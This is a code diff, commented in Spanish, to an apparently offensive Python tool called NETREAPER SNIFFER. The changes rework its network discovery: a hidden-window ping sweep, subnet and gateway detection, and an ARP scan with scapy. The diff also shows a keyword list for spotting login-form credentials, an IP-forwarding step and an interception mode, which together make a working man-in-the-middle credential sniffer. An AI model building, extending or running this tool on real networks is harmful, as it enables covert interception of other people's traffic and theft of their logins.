@@ -7,6 +7,9 @@ import socket
 import subprocess
 import threading
 import time
+import ipaddress
+import sys
+from scapy.all import sniff, IP, TCP, Raw, IFACES, ARP, Ether, sendp, srp, get_if_hwaddr, conf
 
 # Palabras clave comunes en formularios de login
 KEYWORDS = ["username", "user", "email", "login",
@@ -116,30 +119,40 @@ def detectar_interfaz():
     return None, None, mi_ip
 
 
-def forzar_descubrimiento(mi_ip):
-    partes = mi_ip.split(".")
-    if len(partes) != 4: return
-    base = f"{partes[0]}.{partes[1]}.{partes[2]}"
-    print(f"[*] Forzando descubrimiento de red en {base}.0/24 (Ping Sweep)...")
+def forzar_descubrimiento(rango):
+    # #VIPREDSniffer 3 - El Olfateador Activo (Descubrimiento previo)
+    try:
+        red = ipaddress.IPv4Network(rango)
+    except:
+        return
+        
+    print(f"[*] Forzando descubrimiento de red en {rango} ({len(list(red.hosts()))} hosts)...")
     
     def hacer_ping(ip):
         try:
-            # 0x08000000 = CREATE_NO_WINDOW evita consolas negras en Windows
-            subprocess.call(["ping", "-n", "1", "-w", "300", ip], 
+            subprocess.call(["ping", "-n", "1", "-w", "200", ip], 
                             stdout=subprocess.DEVNULL, 
                             stderr=subprocess.DEVNULL,
                             creationflags=0x08000000)
         except: pass
 
     hilos = []
-    for i in range(1, 255):
-        t = threading.Thread(target=hacer_ping, args=(f"{base}.{i}",))
-        t.daemon = True
+    hosts = list(red.hosts())
+    if len(hosts) > 1024:
+        print("[!] Red grande, limitando escaneo inicial a 1024 IPs.")
+        hosts = hosts[:1024]
+
+    for host in hosts:
+        t = threading.Thread(target=hacer_ping, args=(str(host),))
         t.start()
         hilos.append(t)
+        if len(hilos) > 100:
+            for h in hilos: h.join()
+            hilos = []
+    for h in hilos: h.join()
     
-    time.sleep(3)
-    print("[*] Descubrimiento completado. Iniciando sniffer...")
+    time.sleep(3.5)
+    print("[*] Descubrimiento completado.")
 
 
 def activar_ip_forwarding():
@@ -168,21 +181,16 @@ def activar_ip_forwarding():
         pass
 
 
-def detectar_red_completa(mi_ip):
+def detectar_red_completa(mi_ip, interfaz):
     gateway = None
     try:
         resultado = subprocess.check_output("ipconfig", encoding="cp850", errors="ignore")
-        en_adaptador = False
         for linea in resultado.splitlines():
-            if mi_ip in linea:
-                en_adaptador = True
-            if en_adaptador and ("Puerta de enlace" in linea or "Default Gateway" in linea):
-                partes = linea.split(":")
-                if len(partes) > 1:
-                    gw = partes[-1].strip()
-                    if gw and gw != "" and "." in gw:
-                        gateway = gw
-                        break
+            if ("Puerta de enlace" in linea or "Default Gateway" in linea) and ":" in linea:
+                gw = linea.split(":")[-1].strip()
+                if gw and "." in gw:
+                    gateway = gw
+                    break
     except Exception:
         pass
 
@@ -190,8 +198,19 @@ def detectar_red_completa(mi_ip):
         partes = mi_ip.split(".")
         gateway = f"{partes[0]}.{partes[1]}.{partes[2]}.1"
 
-    partes = mi_ip.split(".")
-    rango = f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"
+    mascara = "255.255.255.0"
+    for iface_name in conf.ifaces:
+        iface = conf.ifaces[iface_name]
+        if getattr(iface, 'ip', None) == mi_ip:
+            mascara = getattr(iface, 'netmask', "255.255.255.0")
+            break
+
+    try:
+        rango = str(ipaddress.IPv4Interface(f"{mi_ip}/{mascara}").network)
+    except:
+        partes = mi_ip.split(".")
+        rango = f"{partes[0]}.{partes[1]}.{partes[2]}.0/24"
+        
     return gateway, rango
 
 
@@ -249,7 +268,6 @@ def obtener_mac(ip, interfaz):
 
 
 def escanear_red(rango, interfaz, mi_ip, gateway):
-    forzar_descubrimiento(mi_ip)
     paquete = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rango)
     respondidos, _ = srp(paquete, iface=interfaz, timeout=4, verbose=False)
 
@@ -351,18 +369,22 @@ def hilo_interceptar_red(interfaz, mi_ip, gateway, rango, objetivo_ip=""):
 def main():
     print("=" * 55)
     print("       NETREAPER SNIFFER — MODO TOTALMENTE AUTOMATICO")
-    print("=" * 55)
-
-    INTERFAZ, nombre, mi_ip = detectar_interfaz()
+    # 1. Detectar IP e interfaz
+    INTERFAZ, IFACE_NAME, mi_ip = detectar_interfaz()
     if not INTERFAZ:
-        print("[!] No se encontró una interfaz activa.")
+        print("[!] No se pudo encontrar una interfaz activa.")
         return
-
-    # 1. Habilitar el Forwarding de Windows para no cortar el internet
-    activar_ip_forwarding()
+    
+    print(f"[+] Interfaz Activa: {IFACE_NAME}")
+    print(f"[+] Tu IP Local    : {mi_ip}")
 
     # 2. Descubrir la red
-    gateway, rango = detectar_red_completa(mi_ip)
+    gateway, rango = detectar_red_completa(mi_ip, INTERFAZ)
+    print(f"[+] Gateway (Router): {gateway}")
+    print(f"[+] Rango de Red   : {rango}")
+
+    # Forzar descubrimiento previo
+    forzar_descubrimiento(rango)
     
     print("\n" + "="*55)
     print(" [?] MODO DE INTERCEPCIÓN")
